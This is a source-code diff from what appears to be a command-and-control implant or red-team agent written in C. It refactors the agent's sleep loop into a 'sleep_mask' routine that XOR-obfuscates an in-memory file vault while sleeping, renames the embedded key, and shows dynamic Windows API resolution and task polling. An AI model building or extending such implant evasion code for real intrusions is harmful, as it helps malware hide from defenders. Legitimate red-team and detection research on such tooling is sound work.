@@ -4,7 +4,7 @@
 #include "headers/HTTP.h"
 
 char ENC_PARAMS[1024] __attribute__((section(".text")));
-char XORKEY[128]      __attribute__((section(".text")));
+char ENC_KEY[128]      __attribute__((section(".text")));
 
 WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
@@ -34,26 +34,15 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void agent_mask(AgentState *state) {
-	// Don't bother masking for interactive agents.
-	if (state->sleep_time < 3) {
-		return;
-	}
-	
-	// Only obfuscates the file vault, not the agent itself (for now). TODO
-	// This should be a PICO, but for now the obfuscation algorithm is built-in. TODO
-	xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, XORKEY, XORKEY_LEN);
-}
+void sleep_mask(AgentState *state) {
+	// Mask vault (hardcoded for now).
+	if (state->sleep_time >= 3) { xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
 
-void agent_unmask(AgentState *state) {
-	// Don't bother masking for interactive agents.
-	if (state->sleep_time < 3) {
-		return;
-	}
-	
-	// Only deobfuscates the file vault, not the agent itself (for now). TODO
-	// This should be a PICO, but for now the deobfuscation algorithm is built-in. (TODO)
-	xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, XORKEY, XORKEY_LEN);
+	// TODO no logic for masking the agent itself!
+	KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), state->sleep_time * 1000);
+		
+	// Unmask vault (hardcoded for now).
+	if (state->sleep_time >= 3) { xorify(state->file_vault.data, state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
 }
 
 void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
@@ -338,7 +327,7 @@ void go() {
 	AgentState state = { 0 };
 	state.sleep_time = DEFAULT_SLEEP_TIME;
 	
-	unpack_params(ENC_PARAMS, XORKEY, &state.params);
+	unpack_params(ENC_PARAMS, ENC_KEY, ENC_KEY_LEN, &state.params);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Parameters unpacked.");
@@ -356,7 +345,7 @@ void go() {
 	dprintf("Resolved PICO loading functions.");
 	#endif
 	
-	state.builtin_picos = load_builtin_picos(&state.file_vault, XORKEY, XORKEY_LEN);
+	state.builtin_picos = load_builtin_picos(&state.file_vault, ENC_KEY, ENC_KEY_LEN);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Loaded PICO capabilities.");
@@ -392,9 +381,7 @@ void go() {
 	state.builtin_picos.checkin = "(UNALLOCATED)";
 	
 	while (1) {
-		agent_mask(&state);
-		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), state.sleep_time * 1000);
-		agent_unmask(&state);
+		sleep_mask(&state);
 		
 		TaskingReply tasking_reply = { 0 };
 		BOOL task_result = perform_tasking(&state, &tasking_reply);
